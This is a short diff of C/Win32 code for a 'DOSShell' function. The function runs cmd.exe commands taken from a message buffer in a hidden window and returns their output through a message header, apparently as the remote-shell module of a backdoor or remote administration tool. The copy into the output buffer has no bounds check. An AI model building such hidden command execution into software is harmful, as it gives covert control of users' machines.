@@ -3,7 +3,8 @@
 #include "shlwapi.h"
 #pragma comment(lib,"shlwapi.lib")
 
-//单管道Shell
+#define MsgOut MsgDbg
+
 void DOSShell(char *pBuf, LPMsgHead lpMsgHead)
 {
 	STARTUPINFO si;
@@ -12,7 +13,7 @@ void DOSShell(char *pBuf, LPMsgHead lpMsgHead)
 	HANDLE hRead = NULL, hWrite = NULL;
 
 	TCHAR Cmdline[256] = "cmd.exe /c ";
-	char ReadBuf[1024] = { 0 };    //发送缓冲
+	char ReadBuf[2048] = { 0 }; 
 	DWORD dwLen = 0, bytesRead = 0;
 
 	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
@@ -34,6 +35,7 @@ void DOSShell(char *pBuf, LPMsgHead lpMsgHead)
 	ZeroMemory(&si, sizeof(STARTUPINFO));
 	si.cb = sizeof(STARTUPINFO);
 	GetStartupInfo(&si);
+	//si.hStdInput = hRead;
 	si.hStdError = hWrite;
 	si.hStdOutput = hWrite;
 	si.wShowWindow = SW_HIDE;
@@ -52,15 +54,16 @@ void DOSShell(char *pBuf, LPMsgHead lpMsgHead)
 		return;
 	}
 
-	while (ReadFile(hRead, ReadBuf, 1024, &bytesRead, NULL))
+	while (ReadFile(hRead, ReadBuf, 2048, &bytesRead, NULL))
 	{
 		memcpy(pBuf + dwLen, ReadBuf, bytesRead);
 		dwLen += bytesRead;
-
-		ZeroMemory(ReadBuf, 1024);
+		ZeroMemory(ReadBuf, 2048);
 
 		Sleep(100);
 	}
+
+	MsgOut(pBuf);
 
 	lpMsgHead->dwCmd = 0;
 	lpMsgHead->dwSize = dwLen;
